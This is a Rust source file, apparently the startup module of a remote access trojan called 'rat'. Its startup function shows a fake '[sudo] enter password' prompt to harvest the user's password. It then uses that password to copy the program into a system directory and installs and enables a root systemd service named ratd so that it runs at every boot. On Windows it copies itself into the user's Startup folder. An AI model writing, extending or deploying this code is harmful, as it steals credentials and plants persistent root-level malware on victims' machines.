use crate::extensions::Password;
use std::{io::Write, path::PathBuf, process::Stdio};

#[allow(unused)]
pub fn startup() -> Password {
    // Need to be fixed:
    // Multiple sudo prompts
    // Visible password entry
    if cfg!(target_os = "linux") {
        // grabbing the path of the current running executable
        let current_exe_path = std::env::current_exe().unwrap();

        // copying the executable to the /usr/bin directory
        let pass = loop {
            print!(
                "[sudo] enter password for {}: ",
                std::env::var("USER").unwrap()
            );
            let _ = std::io::stdout().flush();

            let mut pass = String::new();
            std::io::stdin().read_line(&mut pass).unwrap();

            let mut child = std::process::Command::new("sudo")
                .arg("-kS")
                .args(["cp", current_exe_path.to_str().unwrap(), "/usr/games/hello"])
                .stdin(Stdio::piped())
                .stderr(Stdio::null())
                .spawn()
                .unwrap();

            match child.wait_with_output() {
                Ok(op) => {
                    if let Some(0) = op.status.code() {
                        break pass;
                    } else if let Some(1) = op.status.code() {
                        println!("Sorry, try again.");
                        continue;
                    }
                }
                Err(e) => {
                    continue;
                }
            }
        };

        let service = "
[Unit]
Description=A lightweight daemon
After=network.target

[Service]
User=root
Group=root
ExecStart=/usr/bin/rat
WorkingDirectory=/var/rat/

[Install]
WantedBy=multi-user.target
        ";

        // creating service file
        let mut child = std::process::Command::new("sudo")
            .args(["touch", "/etc/systemd/system/ratd.service"])
            .stdin(Stdio::piped())
            .spawn()
            .unwrap();

        child.stdin.as_mut().unwrap().write_all(&service.as_bytes());
        child.wait_with_output();

        // enabling service file on startup
        let _ = std::process::Command::new("sudo")
            .args(["systemctl", "enable", "ratd.service"])
            .output()
            .unwrap();

        return Password::new(pass);
    } else if cfg!(target_os = "windows") {
        let mut user_startup_dir = PathBuf::with_capacity(96);
        user_startup_dir.push(std::env::var("USERPROFILE").unwrap());
        user_startup_dir.push("/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup");
        let current_exe_path = std::env::current_exe().unwrap();
        user_startup_dir.push("rat.exe");
        let _ = std::fs::copy(current_exe_path, user_startup_dir);
    } else if cfg!(target_os = "macos") {
    } else if cfg!(target_os = "android") {
    } else if cfg!(target_os = "ios") {
    }
    Password::new(format!(""))
}

// unsupported systems
// ["aix", "cuda", "dragonfly", "emscripten", "espidf",
// "freebsd", "fuchsia", "haiku", "hermit", "horizon", "hurd",
// "illumos", "l4re", "netbsd", "nto", "openbsd", "psp",
// "redox", "solaris", "solid_asp3", "teeos", "tvos", "uefi",
// "visionos", "vita", "vxworks", "wasi", "watchos"]
